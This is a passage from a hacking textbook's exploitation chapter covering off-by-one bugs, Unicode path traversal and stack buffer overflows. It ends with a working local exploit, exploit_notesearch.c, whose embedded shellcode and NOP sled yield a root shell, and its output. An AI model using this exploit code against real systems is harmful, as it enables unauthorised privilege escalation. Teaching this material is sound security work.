EXPLOITATION
Program exploitation is a staple of hacking. As demon-
strated in the previous chapter, a program is made up
of a complex set of rules following a certain execution
flow that ultimately tells the computer what to do.
Exploiting a program is simply a clever way of getting
the computer to do what you want it to do, even if the
currently running program was designed to prevent that action. Since a
program can really only do what it’s designed to do, the security holes are
actually flaws or oversights in the design of the program or the environment
the program is running in. It takes a creative mind to find these holes and
to write programs that compensate for them. Sometimes these holes are
the products of relatively obvious programmer errors, but there are some
less obvious errors that have given birth to more complex exploit techniques
that can be applied in many different places.A program can only do what it’s programmed to do, to the letter of the law.
Unfortunately, what’s written doesn’t always coincide with what the program-
mer intended the program to do. This principle can be explained with a joke:
A man is walking through the woods, and he finds a magic lamp on
the ground. Instinctively, he picks the lamp up, rubs the side of it
with his sleeve, and out pops a genie. The genie thanks the man for
freeing him, and offers to grant him three wishes. The man is ecstatic
and knows exactly what he wants.
“First,” says the man, “I want a billion dollars.”
The genie snaps his fingers and a briefcase full of money
materializes out of thin air.
The man is wide eyed in amazement and continues, “Next, I want
a Ferrari.”
The genie snaps his fingers and a Ferrari appears from a puff
of smoke.
The man continues, “Finally, I want to be irresistible to women.”
The genie snaps his fingers and the man turns into a box
of chocolates.
Just as the man’s final wish was granted based on what he said, rather
than what he was thinking, a program will follow its instructions exactly, and
the results aren’t always what the programmer intended. Sometimes the
repercussions can be catastrophic.
Programmers are human, and sometimes what they write isn’t exactly
what they mean. For example, one common programming error is called an
off-by-one error. As the name implies, it’s an error where the programmer has
miscounted by one. This happens more often than you might think, and it is
best illustrated with a question: If you’re building a 100-foot fence, with fence
posts spaced 10 feet apart, how many fence posts do you need? The obvious
answer is 10 fence posts, but this is incorrect, since you actually need 11. This
type of off-by-one error is commonly called a fencepost error, and it occurs when a
programmer mistakenly counts items instead of spaces between items, or
vice versa. Another example is when a programmer is trying to select a range of
numbers or items for processing, such as items N through M. If N = 5 and M = 17,
how many items are there to process? The obvious answer is M - N, or 17 - 5 = 12
items. But this is incorrect, since there are actually M - N + 1 items, for a total
of 13 items. This may seem counterintuitive at first glance, because it is, and
that’s exactly why these errors happen.
Often, fencepost errors go unnoticed because programs aren’t tested for
every single possibility, and the effects of a fencepost error don’t generally
occur during normal program execution. However, when the program is fed
the input that makes the effects of the error manifest, the consequences of the
error can have an avalanche effect on the rest of the program logic. When
properly exploited, an off-by-one error can cause a seemingly secure program
to become a security vulnerability.
One classic example of this is OpenSSH, which is meant to be a secure
terminal communication program suite, designed to replace insecure and
116
0x 300unencrypted services such as telnet, rsh, and rcp. However, there was an off-
by-one error in the channel-allocation code that was heavily exploited. Specific-
ally, the code included an if statement that read:
if (id < 0 || id > channels_alloc) {
It should have been
if (id < 0 || id >= channels_alloc) {
In plain English, the code reads If the ID is less than 0 or the ID is greater
than the channels allocated, do the following stuff, when it should have been If the
ID is less than 0 or the ID is greater than or equal to the channels allocated, do the
following stuff.
This simple off-by-one error allowed further exploitation of the pro-
gram, so that a normal user authenticating and logging in could gain full
administrative rights to the system. This type of functionality certainly wasn’t
what the programmers had intended for a secure program like OpenSSH,
but a computer can only do what it’s told.
Another situation that seems to breed exploitable programmer errors is
when a program is quickly modified to expand its functionality. While this
increase in functionality makes the program more marketable and increases
its value, it also increases the program’s complexity, which increases the
chances of an oversight. Microsoft’s IIS webserver program is designed to
serve static and interactive web content to users. In order to accomplish this,
the program must allow users to read, write, and execute programs and files
within certain directories; however, this functionality must be limited to those
particular directories. Without this limitation, users would have full control of
the system, which is obviously undesirable from a security perspective. To
prevent this situation, the program has path-checking code designed to
prevent users from using the backslash character to traverse backward through
the directory tree and enter other directories.
With the addition of support for the Unicode character set, though, the
complexity of the program continued to increase. Unicode is a double-byte
character set designed to provide characters for every language, including
Chinese and Arabic. By using two bytes for each character instead of just one,
Unicode allows for tens of thousands of possible characters, as opposed to
the few hundred allowed by single-byte characters. This additional complexity
means that there are now multiple representations of the backslash charac-
ter. For example, %5c in Unicode translates to the backslash character, but
this translation was done after the path-checking code had run. So by using
%5c instead of \, it was indeed possible to traverse directories, allowing
the aforementioned security dangers. Both the Sadmind worm and the
CodeRed worm used this type of Unicode conversion oversight to deface
web pages.
A related example of this letter-of-the-law principle used outside the
realm of computer programming is the LaMacchia Loophole. Just like the
rules of a computer program, the US legal system sometimes has rules that
Ex pl oit a ti on
117don’t say exactly what their creators intended, and like a computer program
exploit, these legal loopholes can be used to sidestep the intent of the law.
Near the end of 1993, a 21-year-old computer hacker and student at MIT
named David LaMacchia set up a bulletin board system called Cynosure for
the purposes of software piracy. Those who had software to give would upload
it, and those who wanted software would download it. The service was only
online for about six weeks, but it generated heavy network traffic worldwide,
which eventually attracted the attention of university and federal authorities.
Software companies claimed that they lost one million dollars as a result of
Cynosure, and a federal grand jury charged LaMacchia with one count of
conspiring with unknown persons to violate the wire fraud statue. However,
the charge was dismissed because what LaMacchia was alleged to have done
wasn’t criminal conduct under the Copyright Act, since the infringement
was not for the purpose of commercial advantage or private financial gain.
Apparently, the lawmakers had never anticipated that someone might engage
in these types of activities with a motive other than personal financial gain.
(Congress closed this loophole in 1997 with the No Electronic Theft Act.)
Even though this example doesn’t involve the exploiting of a computer
program, the judges and courts can be thought of as computers executing
the program of the legal system as it was written. The abstract concepts of
hacking transcend computing and can be applied to many other aspects
of life that involve complex systems.
0x310
Generalized Exploit Techniques
Off-by-one errors and improper Unicode expansion are all mistakes that can
be hard to see at the time but are glaringly obvious to any programmer in
hindsight. However, there are some common mistakes that can be exploited
in ways that aren’t so obvious. The impact of these mistakes on security isn’t
always apparent, and these security problems are found in code everywhere.
Because the same type of mistake is made in many different places, general-
ized exploit techniques have evolved to take advantage of these mistakes, and
they can be used in a variety of situations.
Most program exploits have to do with memory corruption. These include
common exploit techniques like buffer overflows as well as less-common
methods like format string exploits. With these techniques, the ultimate goal
is to take control of the target program’s execution flow by tricking it into
running a piece of malicious code that has been smuggled into memory.
This type of process hijacking is known as execution of arbitrary code, since the
hacker can cause a program to do pretty much anything he or she wants it to.
Like the LaMacchia Loophole, these types of vulnerabilities exist because
there are specific unexpected cases that the program can’t handle. Under
normal conditions, these unexpected cases cause the program to crash—
metaphorically driving the execution flow off a cliff. But if the environment
is carefully controlled, the execution flow can be controlled—preventing the
crash and reprogramming the process.
118
0x 3000x320
Buffer Overflows
Buffer overflow vulnerabilities have been around since the early days of com-
puters and still exist today. Most Internet worms use buffer overflow vulner-
abilities to propagate, and even the most recent zero-day VML vulnerability
in Internet Explorer is due to a buffer overflow.
C is a high-level programming language, but it assumes that the
programmer is responsible for data integrity. If this responsibility were
shifted over to the compiler, the resulting binaries would be significantly
slower, due to integrity checks on every variable. Also, this would remove a
significant level of control from the programmer and complicate the
language.
While C’s simplicity increases the programmer’s control and the efficiency
of the resulting programs, it can also result in programs that are vulnerable
to buffer overflows and memory leaks if the programmer isn’t careful. This
means that once a variable is allocated memory, there are no built-in safe-
guards to ensure that the contents of a variable fit into the allocated memory
space. If a programmer wants to put ten bytes of data into a buffer that had
only been allocated eight bytes of space, that type of action is allowed, even
though it will most likely cause the program to crash. This is known as a
buffer overrun or buffer overflow, since the extra two bytes of data will overflow
and spill out of the allocated memory, overwriting whatever happens to
come next. If a critical piece of data is overwritten, the program will crash.
The overflow_example.c code offers an example.
overflow_example.c
#include <stdio.h>
#include <string.h>
int main(int argc, char *argv[]) {
int value = 5;
char buffer_one[8], buffer_two[8];
strcpy(buffer_one, "one"); /* Put "one" into buffer_one. */
strcpy(buffer_two, "two"); /* Put "two" into buffer_two. */
printf("[BEFORE] buffer_two is at %p and contains \'%s\'\n", buffer_two, buffer_two);
printf("[BEFORE] buffer_one is at %p and contains \'%s\'\n", buffer_one, buffer_one);
printf("[BEFORE] value is at %p and is %d (0x%08x)\n", &value, value, value);
printf("\n[STRCPY] copying %d bytes into buffer_two\n\n", strlen(argv[1]));
strcpy(buffer_two, argv[1]); /* Copy first argument into buffer_two. */
printf("[AFTER] buffer_two is at %p and contains \'%s\'\n", buffer_two, buffer_two);
printf("[AFTER] buffer_one is at %p and contains \'%s\'\n", buffer_one, buffer_one);
printf("[AFTER] value is at %p and is %d (0x%08x)\n", &value, value, value);
}
Ex pl oit a ti on
119By now, you should be able to read the source code above and figure out
what the program does. After compilation in the sample output below, we try
to copy ten bytes from the first command-line argument into buffer_two, which
only has eight bytes allocated for it.
reader@hacking:~/booksrc $ gcc -o overflow_example overflow_example.c
reader@hacking:~/booksrc $ ./overflow_example 1234567890
[BEFORE] buffer_two is at 0xbffff7f0 and contains 'two'
[BEFORE] buffer_one is at 0xbffff7f8 and contains 'one'
[BEFORE] value is at 0xbffff804 and is 5 (0x00000005)
[STRCPY] copying 10 bytes into buffer_two
[AFTER] buffer_two is at 0xbffff7f0 and contains '1234567890'
[AFTER] buffer_one is at 0xbffff7f8 and contains '90'
[AFTER] value is at 0xbffff804 and is 5 (0x00000005)
reader@hacking:~/booksrc $
Notice that buffer_one is located directly after buffer_two in memory, so
when ten bytes are copied into buffer_two, the last two bytes of 90 overflow
into buffer_one and overwrite whatever was there.
A larger buffer will naturally overflow into the other variables, but if a large
enough buffer is used, the program will crash and die.
reader@hacking:~/booksrc $ ./overflow_example AAAAAAAAAAAAAAAAAAAAAAAAAAAAA
[BEFORE] buffer_two is at 0xbffff7e0 and contains 'two'
[BEFORE] buffer_one is at 0xbffff7e8 and contains 'one'
[BEFORE] value is at 0xbffff7f4 and is 5 (0x00000005)
[STRCPY] copying 29 bytes into buffer_two
[AFTER] buffer_two is at 0xbffff7e0 and contains
'AAAAAAAAAAAAAAAAAAAAAAAAAAAAA'
[AFTER] buffer_one is at 0xbffff7e8 and contains 'AAAAAAAAAAAAAAAAAAAAA'
[AFTER] value is at 0xbffff7f4 and is 1094795585 (0x41414141)
Segmentation fault (core dumped)
reader@hacking:~/booksrc $
These types of program crashes are fairly common—think of all of the
times a program has crashed or blue-screened on you. The programmer’s
mistake is one of omission—there should be a length check or restriction on
the user-supplied input. These kinds of mistakes are easy to make and can be
difficult to spot. In fact, the notesearch.c program on page 93 contains a buffer
overflow bug. You might not have noticed this until right now, even if you
were already familiar with C.
reader@hacking:~/booksrc $ ./notesearch AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
-------[ end of note data ]-------
Segmentation fault
reader@hacking:~/booksrc $
120
0x 300Program crashes are annoying, but in the hands of a hacker they can
become downright dangerous. A knowledgeable hacker can take control of a
program as it crashes, with some surprising results. The exploit_notesearch.c
code demonstrates the danger.
exploit_notesearch.c
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
char shellcode[]=
"\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68"
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89"
"\xe1\xcd\x80";
int main(int argc, char *argv[]) {
unsigned int i, *ptr, ret, offset=270;
char *command, *buffer;
command = (char *) malloc(200);
bzero(command, 200); // Zero out the new memory.
strcpy(command, "./notesearch \'"); // Start command buffer.
buffer = command + strlen(command); // Set buffer at the end.
if(argc > 1) // Set offset.
offset = atoi(argv[1]);
ret = (unsigned int) &i - offset; // Set return address.
for(i=0; i < 160; i+=4) // Fill buffer with return address.
*((unsigned int *)(buffer+i)) = ret;
memset(buffer, 0x90, 60); // Build NOP sled.
memcpy(buffer+60, shellcode, sizeof(shellcode)-1);
strcat(command, "\'");
system(command); // Run exploit.
free(command);
}
This exploit’s source code will be explained in depth later, but in general,
it’s just generating a command string that will execute the notesearch pro-
gram with a command-line argument between single quotes. It uses string
functions to do this: strlen() to get the current length of the string (to position
the buffer pointer) and strcat() to concatenate the closing single quote to the
end. Finally, the system function is used to execute the command string.
The buffer that is generated between the single quotes is the real meat of the
exploit. The rest is just a delivery method for this poison pill of data. Watch
what a controlled crash can do.
Ex pl oit a ti on
121reader@hacking:~/booksrc $ gcc exploit_notesearch.c
reader@hacking:~/booksrc $ ./a.out
[DEBUG] found a 34 byte note for user id 999
[DEBUG] found a 41 byte note for user id 999
-------[ end of note data ]-------
sh-3.2#
The exploit is able to use the overflow to serve up a root shell—providing
full control over the co

